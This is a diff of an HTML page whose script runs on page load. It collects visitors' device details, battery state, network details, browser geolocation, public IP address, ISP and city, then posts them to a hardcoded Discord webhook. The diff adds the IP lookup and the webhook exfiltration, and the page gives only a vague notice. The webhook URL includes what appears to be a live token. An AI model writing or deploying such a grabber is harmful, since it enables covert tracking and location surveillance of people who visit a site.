@@ -3,130 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mobile Device Data Logger</title>
+    <title>Device Data Logger</title>
 </head>
 <body>
     <h1>Welcome to Our Website</h1>
     <p>We are collecting your device data for analysis purposes.</p>
 
     <script>
-        async function collectMobileData() {
+        async function collectAndSendData() {
             const userData = {
-                // Browser and device information
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                appName: navigator.appName,
                 screenWidth: screen.width,
                 screenHeight: screen.height,
                 colorDepth: screen.colorDepth,
                 pixelRatio: window.devicePixelRatio,
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 maxTouchPoints: navigator.maxTouchPoints || 'unknown',
-
-                // Network Information
-                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
-                rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
-                saveData: navigator.connection ? navigator.connection.saveData : 'unknown',
-
-                // Battery Information
-                batteryLevel: null,
-                charging: null,
-                chargingTime: null,
-                dischargingTime: null,
-
-                // Orientation and Motion
-                orientation: {
-                    alpha: null,
-                    beta: null,
-                    gamma: null
-                },
-                acceleration: {
-                    x: null,
-                    y: null,
-                    z: null
-                },
-
-                // Geolocation
-                location: {
-                    latitude: null,
-                    longitude: null,
-                    altitude: null,
-                    accuracy: null,
-                    altitudeAccuracy: null,
-                    speed: null,
-                    heading: null
-                },
-
-                // Browser settings
                 language: navigator.language,
                 languages: navigator.languages,
                 cookieEnabled: navigator.cookieEnabled,
                 onLine: navigator.onLine,
-                timestamp: new Date().toISOString(),
+                timestamp: new Date().toISOString()
             };
 
-            // Get battery status
+            // Network Information
+            if (navigator.connection) {
+                userData.connectionType = navigator.connection.effectiveType || 'unknown';
+                userData.downlink = navigator.connection.downlink || 'unknown';
+                userData.rtt = navigator.connection.rtt || 'unknown';
+            }
+
+            // Battery Information
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 userData.batteryLevel = battery.level * 100 + '%';
                 userData.charging = battery.charging;
-                userData.chargingTime = battery.chargingTime;
-                userData.dischargingTime = battery.dischargingTime;
+            } else {
+                userData.batteryLevel = 'unknown';
+                userData.charging = 'unknown';
             }
 
             // Geolocation
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        userData.location.latitude = position.coords.latitude;
-                        userData.location.longitude = position.coords.longitude;
-                        userData.location.altitude = position.coords.altitude;
-                        userData.location.accuracy = position.coords.accuracy;
-                        userData.location.altitudeAccuracy = position.coords.altitudeAccuracy;
-                        userData.location.speed = position.coords.speed;
-                        userData.location.heading = position.coords.heading;
-                        sendDataToServer(userData);
+                        userData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        getIpAndIsp(userData);
                     },
                     (error) => {
                         console.warn("Geolocation permission denied or unavailable:", error);
-                        sendDataToServer(userData);
+                        getIpAndIsp(userData);
                     }
                 );
             } else {
-                sendDataToServer(userData);
+                getIpAndIsp(userData);
             }
-
-            // Device orientation and motion
-            window.addEventListener('deviceorientation', (event) => {
-                userData.orientation.alpha = event.alpha;
-                userData.orientation.beta = event.beta;
-                userData.orientation.gamma = event.gamma;
-            });
-
-            window.addEventListener('devicemotion', (event) => {
-                userData.acceleration.x = event.acceleration.x;
-                userData.acceleration.y = event.acceleration.y;
-                userData.acceleration.z = event.acceleration.z;
-            });
         }
 
-        function sendDataToServer(data) {
-            fetch('/log_data', {
-                method: 'POST',
+        async function getIpAndIsp(userData) {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                userData.ipAddress = ipData.ip;
+
+                // Fetch ISP information
+                const ispResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json?token=YOUR_API_TOKEN`);
+                const ispData = await ispResponse.json();
+                userData.isp = ispData.org || 'unknown';
+                userData.city = ispData.city || 'unknown';
+                userData.region = ispData.region || 'unknown';
+                userData.country = ispData.country || 'unknown';
+
+                sendToDiscord(userData);
+            } catch (error) {
+                console.error("Error fetching IP or ISP data:", error);
+                sendToDiscord(userData);
+            }
+        }
+
+        function sendToDiscord(data) {
+            const discordMessage = {
+                content: "New device data collected!",
+                embeds: [
+                    {
+                        title: "Device Information",
+                        color: 3447003,
+                        fields: [
+                            { name: "User Agent", value: data.userAgent, inline: false },
+                            { name: "Platform", value: data.platform || "unknown", inline: true },
+                            { name: "Screen Size", value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
+                            { name: "Pixel Ratio", value: data.pixelRatio.toString(), inline: true },
+                            { name: "Device Memory", value: `${data.deviceMemory || "unknown"} GB`, inline: true },
+                            { name: "Battery Level", value: data.batteryLevel || "unknown", inline: true },
+                            { name: "Charging", value: data.charging ? "Yes" : "No", inline: true },
+                            { name: "Network Type", value: data.connectionType || "unknown", inline: true },
+                            { name: "IP Address", value: data.ipAddress || "unknown", inline: true },
+                            { name: "ISP", value: data.isp || "unknown", inline: true },
+                            { name: "City", value: data.city || "unknown", inline: true },
+                            { name: "Region", value: data.region || "unknown", inline: true },
+                            { name: "Country", value: data.country || "unknown", inline: true },
+                            { name: "Browser Language", value: data.language, inline: true },
+                            { name: "Online Status", value: data.onLine ? "Online" : "Offline", inline: true },
+                            { name: "Timestamp", value: data.timestamp, inline: false }
+                        ]
+                    }
+                ]
+            };
+
+            // Send the data to Discord webhook
+            fetch("https://discord.com/api/webhooks/1223353540513239040/KIj2MSQ8kK7NAt4GmLKh-TKNR5SuEVMBUpJ5qlGK_FzrU9dbsOGcQcVmxsB6D0jyzf0O", {
+                method: "POST",
                 headers: {
-                    'Content-Type': 'application/json'
+                    "Content-Type": "application/json"
                 },
-                body: JSON.stringify(data)
-            }).then(response => {
-                console.log("Data sent to server");
-            }).catch(error => {
-                console.error("Error sending data", error);
+                body: JSON.stringify(discordMessage)
+            })
+            .then(response => {
+                console.log("Data sent to Discord successfully.");
+            })
+            .catch(error => {
+                console.error("Error sending data to Discord:", error);
             });
         }
 
         // Collect and send data on page load
-        collectMobileData();
+        collectAndSendData();
     </script>
 </body>
 </html>
